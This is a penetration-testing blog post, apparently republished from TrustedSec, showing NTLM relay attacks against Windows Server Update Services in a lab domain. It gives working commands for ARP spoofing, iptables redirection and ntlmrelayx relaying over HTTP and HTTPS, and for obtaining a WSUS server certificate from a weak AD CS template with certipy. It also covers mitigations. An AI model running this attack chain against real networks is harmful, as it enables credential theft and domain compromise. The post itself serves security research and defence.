---
layout: post
date: 2025-09-12
title: "WSUS Is SUS: NTLM Relay Attacks in Plain Sight"
categories: [Penetration Testing]
tags: [active directory, ntlm, wsus, relay attacks]
image:
  path: /assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/WSUSisSUS_WebHero.jpg
---

> Originally published on [TrustedSec](https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight).

Windows Server Update Services (WSUS) is a trusted cornerstone of patch management in many environments, but its reliance on HTTP/HTTPS traffic makes it a prime target for attackers operating on the local network. By intercepting and relaying WSUS authentication flows, it's possible to capture NTLM hashes from both user and machine accounts, turning routine update traffic into an opportunity for credential theft and relay attacks. In this post, I'll show how to identify WSUS traffic, demonstrate how HTTP and HTTPS WSUS endpoints can be abused, and share the path that led me to exploring this attack vector in the first place.

My interest in WSUS exploitation started after coming across [Alex Neff's post on X](https://x.com/al3x_n3ff/status/1936809178913267986) about [wsuks](https://github.com/NeffIsBack/wsuks), a tool for serving malicious updates through WSUS. While weaponizing updates is a unique attack method, that angle isn't the focus of this blog. Not long after, I came across [GoSecure's excellent write-up](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks) on abusing WSUS for NTLM relaying. This shifted my focus from update weaponization to interception and pushed me to dig deeper into how WSUS traffic could be abused in real-world environments.

## WSUS Primer

WSUS is Microsoft's patch distribution platform that is designed to centralize and control how updates flow into an enterprise. Instead of every workstation reaching out directly to Microsoft's update servers, organizations deploy WSUS to act as a trusted middleman. Endpoints register with a WSUS server, periodically check in, and download updates that have been approved by administrators. By default, this traffic flows over port **8530/TCP** for **HTTP** or port **8531/TCP** for **HTTPS.**

WSUS can be configured directly via Group Policy ([Microsoft Docs](https://learn.microsoft.com/en-us/windows/deployment/update/waas-manage-updates-wsus)), integrated into System Center Configuration Manager (SCCM) ([Microsoft Docs](https://learn.microsoft.com/en-us/intune/configmgr/core/clients/deploy/deploy-clients-to-windows-computers)), or even tied in to Intune and Windows Update for Business in co-management scenarios ([Microsoft Docs](https://learn.microsoft.com/en-us/windows/deployment/update/wufb-wsus)). In September 2024, Microsoft officially announced that WSUS is deprecated ([Microsoft Post](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)). While the role is still available and supported in Windows Server 2025, it is no longer receiving new features or investment. Despite its deprecation, WSUS still facilitates authentication flows that attackers can intercept and abuse.

WSUS relies on two (2) main registry values pushed through Group Policy: **_WUServer_** and **_WUStatusServer_**. The **_WUServer_** is where clients check in for updates, sending SOAP POST requests to endpoints like _ClientWebService/client.asmx_ to learn which patches are available and approved. The **_WUStatusServer_** is where those same clients report back, posting installation results to _ReportingWebService/reportingwebservice.asmx_. In most deployments, both values point to the same WSUS server, but they may be split if reporting and update distribution need to be handled separately. [Microsoft illustrates this](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416) complete process in the following diagram:

![WSUS Architecture Diagram](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/FigA_Coontz_WSUS.jpg)

For attackers, a few registry values can significantly impact the ease of exploitation. **_WUServer_** and **_WUStatusServer_** define where the client fetches updates and reports installation results, making them the core indicators of whether a host is tied to WSUS. The **_DetectionFrequencyEnabled_** and **_DetectionFrequency_** values then dictate how often the client checks in. By default, custom detection is disabled, and systems fall back to the 22-hour interval. If custom detection is enabled, the interval can be shortened to as little as one (1) hour, giving attackers more opportunity.

| Registry Key | Purpose |
|---|---|
| WUServer | URL where clients fetch update approvals |
| WUStatusServer | URL where clients report installation results |
| DetectionFrequencyEnabled | Enables custom detection intervals |
| DetectionFrequency | Number of hours between check-ins. Default = 22 |

## WSUS Enumeration

### Unauthenticated

Unauthenticated enumeration of WSUS can be performed either by scanning or by intercepting traffic. A simple **_Nmap_** sweep against 8530/TCP and 8531/TCP will often identify WSUS servers, with service banners revealing IIS and SSL certificate details that confirm the role. Some environments may reconfigure WSUS to use other ports, but these are the defaults.

```bash
nmap -sSVC -Pn --open -p 8530,8531 -iL <host_list>
```

![Nmap scan results showing WSUS server](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig01_Coontz_WSUS.png)

The other option is to use ARP spoofing or DNS spoofing on the local subnet with tools like **_mitm6_**, **_Bettercap_**, or **_arpspoof_**, paired with a listener such as my own tool [wsusniff.py](https://github.com/Coontzy1/WSUScripts/blob/main/wsusniff.py). This technique can intercept WSUS traffic over HTTP and log the requests clients make to endpoints like _ClientWebService/client.asmx_ or _ReportingWebService/reportingwebservice.asmx_.

![wsusniff.py intercepting WSUS traffic](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig02_Coontz_WSUS.png)

It's important to note that this approach only works against HTTP traffic. HTTPS requests are encrypted and won't yield anything useful unless certificate injection is possible. The advantage of running **_wsusniff.py_** is that it produces a list of clients actively communicating with WSUS. Those hosts can then be singled out as prime candidates for ARP or DNS poisoning, since exploitation depends on tricking endpoints into believing the attacker's system is the WSUS server.

### Authenticated

From an authenticated perspective, one (1) way to enumerate WSUS is by reviewing Group Policy settings stored in **SYSVOL**. Since WSUS configuration is usually pushed down via GPOs, the relevant values can often be found in **_Machine\_Registry.pol_** files. Using a tool like **_MANSPIDER_**, this process can be automated across SYSVOL shares to search for WSUS-related registry keys. To make it easier, I built a wrapper called [wsuspider.sh](https://github.com/Coontzy1/WSUScripts/blob/main/wsuspider.sh), which runs **_MANSPIDER_**, automatically parses out keys like **_WUServer_**, **_WUStatusServer_**, and **_UseWUServer_** using **_regpol_**, and then summarizes the results. This provides quick insight into whether WSUS is deployed, how it's configured, and which servers clients may be pointed to.

![wsuspider.sh output](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig03_Coontz_WSUS.png)

If you already have administrative or local access on a machine, the same information can be pulled directly from the registry. The WSUS keys are under **_HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate_** and can be queried with tools like **_NetExec_** or the native **reg query** command.

```bash
nxc smb <client_ip> -u <username> -p <password> -M reg-query -o PATH="HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" KEY="WUServer"
```

![NetExec reg query output](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig04_Coontz_WSUS.png)

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
```

![reg query output](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig05_Coontz_WSUS.png)

## Lab Setup

For this blog post, I've set up a mini lab environment to demonstrate WSUS enumeration and exploitation techniques. The lab architecture looks as follows:

**Domain:** SMOKE.LOCAL

**Machines:**
- **DC1** -- Primary Domain Controller / WSUS Server (192.168.100.100)
- **DC2** -- Secondary Domain Controller / AD CS (192.168.100.201)
- **WIN10-CLIENT** -- Windows 10 Pro (user WIN10-LOWPRIV logged in)
- **WIN11-CLIENT** -- Windows 11 Pro (user WIN11-LOWPRIV logged in)
- **Attacker Box** -- Ubuntu-based attack host

**Users:**
- **WIN10-LOWPRIV** -- Standard domain user on Windows 10
- **WIN11-LOWPRIV** -- Standard domain user on Windows 11

## HTTP Exploitation

For the HTTP exploitation demo, the **_WUServer_** and **_WUStatusServer_** are set to _http://dc1.smoke.local:8530_, which resolves to _192.168.100.100_. Because this traffic flows over HTTP, it's vulnerable to being hijacked on the local subnet. This can be done with a variety of tools, but here we'll just use **_arpspoof_** from the **_dsniff_** suite. By targeting both clients with ARP replies that say the attacker's MAC address belongs to _192.168.100.100_, we trick it into sending its WSUS traffic through our attacker system.

```bash
apt install dsniff
arpspoof -i ens33 -t <wsus_client_ip> <wsus_server_ip>
```

![arpspoof running](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig06_Coontz_WSUS.png)

Once we've poisoned the client into sending its WSUS traffic to us, we still need to make sure our tools are seeing the packets on the right port. To do this, we add an iptables NAT rule that catches all inbound WSUS traffic on 8530/TCP and redirects it to whatever port we're running **ntlmrelayx** on.

```bash
iptables -t nat -A PREROUTING -p tcp --dport 8530 -j REDIRECT --to-ports 8530 #adding rule
iptables -t nat -L PREROUTING --line-numbers   # verify the rule
iptables -t nat -D PREROUTING 1                # remove it when done
```

We're going to start our **ntlmrelayx** listener, but [pull request #2034](https://github.com/fortra/impacket/pull/2034) must be used, as it re-added functionality originally [introduced in #913](https://github.com/fortra/impacket/pull/913). With this running, WSUS client authentications can be relayed to SMB, LDAP/S, or AD CS (ESC8). The setup looks like this:

```bash
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8530
```

![ntlmrelayx setup](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig07_Coontz_WSUS.png)

With enough waiting, once the Windows clients decide to reach out to WSUS, their authentication requests will be sent to our relay listener. In a real environment, this happens on the schedule defined by **DetectionFrequency**, but it can also be triggered manually with the **Check for Updates** option in **Windows Update** settings or by running:

```bash
wuauclt.exe /detectnow
```

As shown in the output below, the WSUS traffic is captured, and the machine accounts (**WIN10-CLIENT$,WIN11-CLIENT$**) are successfully relayed to LDAP on the domain controller, where they're available as SOCKS connections for further exploitation.

![Machine accounts relayed via WSUS](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig08_Coontz_WSUS.png)

![SOCKS connections available](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig09_Coontz_WSUS.png)

From GoSecure: "After the application of KB4571756 and KB4577041 allowing to fix CVE-2020-1013 ... this behavior was modified back to what seemed to be the originally intended one. The Windows Update client no longer authenticated using a user account and exclusively uses the machine account."

That said, while user accounts are no longer used when authenticating to endpoints like _/ClientWebService/client.asmx_ or _/SimpleAuthWebService/simpleauth.asmx_, they still may show up in authentication attempts to _/ReportingWebService/reportingwebservice.asmx_ if a user is logged in. Authentication to the reporting service may send either machine or user hashes. Despite repeated testing, the reason for this inconsistency remains unclear. Please reach out if you've observed this behavior in more detail.

![User hash captured from reporting service](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/FigB_Coontz_WSUS.jpg)

![Additional relay output](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig10_Coontz_WSUS.png)

![Relay results](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig11_Coontz_WSUS.png)

## HTTPS Exploitation

While HTTP exploitation can be carried out without any credentials, there is also an opportunity to attack WSUS when it is configured over **HTTPS**. To do this, an attacker must obtain a certificate that is trusted by the WSUS clients. This can be accomplished through Active Directory Certificate Services (AD CS), but it requires access to an account that can enroll in a certificate template configured with **Enrollee Supplies Subject.** With that privilege, the attacker can request a certificate for the WSUS server's hostname, effectively making their spoofed server trusted by clients and enabling the same style of interception and relay as the HTTP scenario.

![HTTPS exploitation overview](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/FigC_Coontz_WSUS.png)

Enumeration of the AD CS infrastructure can be done with **_Certipy_**.

```bash
certipy find -u <username> -p <password> -dc-ip <IP> -enabled
```

After, the **JSON** results can be parsed with **jq** to easily enumerate target templates.

```bash
jq -r ' .["Certificate Templates"][] | select(.["Enrollee Supplies Subject"] and .Enabled) | "\(.["Template Name"])\n" + (.Permissions["Enrollment Permissions"]["Enrollment Rights"] | map("  " + .) | join("\n")) + "\n" ' <certipy_output.json>
```

![Certipy enumeration results](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig12_Coontz_WSUS.png)

Looking at the **VulnerableWebServer** certificate template, we can see that it is enabled for enrollment by any authenticated user in the domain. More importantly, the template allows **Enrollee Supplies Subject**, meaning an attacker can specify arbitrary hostnames when requesting a certificate.

By abusing this, a low-privileged user can request a certificate for the WSUS server and receive a PFX file containing a trusted server certificate and private key.

```bash
certipy req -u <user@domain> -p <password> -ca <ca_name> -template <template> -subject <CN=WSUS.FQDN> -dns <WSUS.FQDN> -out <output.pfx> -dc-ip <IP>
```

![Certificate request](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig13_Coontz_WSUS.png)

After requesting the certificate, the PFX file can be split into its components for use in tools. Using **_OpenSSL_**, the private key and the certificate are extracted into separate files.

```bash
openssl pkcs12 -in <PFX.pfx> -nocerts -out <KEY.key> -nodes
openssl pkcs12 -in <PFX.pfx> -clcerts -nokeys -out <CERT.crt>
```

![OpenSSL extraction](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig14_Coontz_WSUS.png)

The same steps performed previously for ARP/DNS spoofing must also be done when targeting HTTPS. In addition, the iptables NAT rule is required to forward 8531/TCP to 8531/TCP.

```bash
iptables -t nat -A PREROUTING -p tcp --dport 8531 -j REDIRECT --to-ports 8531 #adding rule
iptables -t nat -L PREROUTING --line-numbers   # verify the rule
iptables -t nat -D PREROUTING 1                # remove it when done
```

Finally, the **ntlmrelayx** listener can be started. [Pull request #2034](https://github.com/fortra/impacket/pull/2034) must be used as it adds support for HTTPS relay. In this case, the command includes the **\--https**, **\--certfile**, and **\--keyfile** options to present the trusted certificate.

```bash
ntlmrelayx.py -t ldap://<DC> -smb2support -socks --keep-relaying --http-port 8531 --https --certfile <CERT.crt> --keyfile <KEY.key>
```

![HTTPS ntlmrelayx setup](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig15_Coontz_WSUS.png)

Once the Windows clients decide to reach out to WSUS, our listener captures and relays the authentication. User hashes can also be captured over HTTPS when authentication attempts target _/ReportingWebService/reportingwebservice.asmx_.

![HTTPS relay capture](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/FigD_Coontz_WSUS.jpg)

![HTTPS machine account relay](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig16_Coontz_WSUS.png)

![HTTPS relay results](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig17_Coontz_WSUS.png)

![HTTPS user hash capture](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/FigE_Coontz_WSUS.jpg)

![HTTPS SOCKS connections](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/FigF_Coontz_WSUS.jpg)

![Final HTTPS exploitation results](/assets/img/WSUS-Is-SUS-NTLM-Relay-Attacks-in-Plain-Sight/Fig18_Coontz_WSUS.png)

## Mitigations

Mitigations for this attack chain start with hardening how WSUS communicates. Enabling HTTPS on WSUS prevents it from being exploited from an unauthenticated perspective and stops attackers from trivially harvesting machine or user credentials over HTTP. In environments with AD CS, however, care must be taken with certificate templates. If all users can enroll in a template that allows **Enrollee Supplies Subject**, this may permit an attacker to obtain a certificate for the WSUS server itself and carry out HTTPS interception.

Beyond WSUS-specific controls, the broader threat of NTLM relay can be reduced by enforcing SMB Signing, enabling LDAP signing, and requiring channel binding on LDAPS. Preventing ARP spoofing and DNS spoofing at the network layer also disrupts the traffic redirection that exploitation depends on. Finally, since NTLM authentication still exposes hashes, strong password policies (or ideally, reducing reliance on NTLM in favor of Kerberos) help mitigate the likelihood of captured credentials being recovered and reused.

## Conclusion

In summary, WSUS can be exploited with clients in the local subnet by spoofing to convince them the attacker is the WSUS server. Over **HTTP**, this enables interception and relay of traffic to capture machine and user hashes. Even when WSUS is configured for **HTTPS**, the same attacks remain possible if a trusted certificate can be obtained, allowing interception of encrypted traffic and capture of credentials just as with HTTP.

### Shoutouts

- Scott Nusbaum - Code Review
- Dennis Shannon - wsuspider.sh + Content Review
- Lou Scicchitano & Kevin Clark - HTTPS Exploitation Ideas
- Multiple TrustedSec Members & [Ethan Tomford](https://www.linkedin.com/in/ethan-tomford) - Miscellaneous Questions, Testing, and Feedback

### Additional References

- [WSUScripts - GitHub](https://github.com/Coontzy1/WSUScripts)
- [wsuks - GitHub](https://github.com/NeffIsBack/wsuks)
- [Impacket PR #913](https://github.com/fortra/impacket/pull/913/commits/e59ff693873e4478ba196b683a7a126998bce90b)
- [Impacket PR #2034](https://github.com/fortra/impacket/pull/2034)
- [GoSecure - WSUS Attacks Part 1](https://gosecure.ai/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/)
- [GoSecure - WSUS Attacks Part 2](https://gosecure.ai/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [GoSecure - WSUS NTLM Relaying](https://gosecure.ai/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/)
- [WSUS to ESC8](https://j4s0nmo0n.github.io/belettetimoree.github.io/2023-12-01-WSUS-to-ESC8.html)
- [Microsoft - WSUS SSL Setup](https://learn.microsoft.com/de-de/security-updates/windowsupdateservices/18127499)
- [Microsoft - Deploy SCCM Clients](https://learn.microsoft.com/en-us/intune/configmgr/core/clients/deploy/deploy-clients-to-windows-computers)
- [Microsoft - Install SUP Role](https://learn.microsoft.com/en-us/intune/configmgr/sum/get-started/install-a-software-update-point)
- [Microsoft - Manage Software Update Settings](https://learn.microsoft.com/en-us/intune/configmgr/sum/get-started/manage-settings-for-software-updates)
- [Microsoft - WSUS Protocol Overview](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsusod/e00a5e81-c600-40d9-96b5-9cab78364416)
- [Microsoft - Manage Updates with WSUS](https://learn.microsoft.com/en-us/windows/deployment/update/waas-manage-updates-wsus)
- [Microsoft - Windows Update Settings](https://learn.microsoft.com/en-us/windows/deployment/update/waas-wu-settings)
- [Microsoft - WUFB + WSUS](https://learn.microsoft.com/en-us/windows/deployment/update/wufb-wsus)
- [Microsoft - WSUS Deprecation](https://techcommunity.microsoft.com/blog/windows-itpro-blog/windows-server-update-services-wsus-deprecation/4250436)
- [AJTEK - WSUS SSL Setup Guide](https://www.ajtek.ca/wsus/how-to-setup-manage-and-maintain-wsus-part-7-ssl-setup-for-wsus-and-why-you-should-care/)
- [Prajwal Desai - SCCM SUP Role](https://www.prajwaldesai.com/install-sccm-software-update-point-role/)
- [Alex Neff on X](https://x.com/al3x_n3ff/status/1936809178913267986)
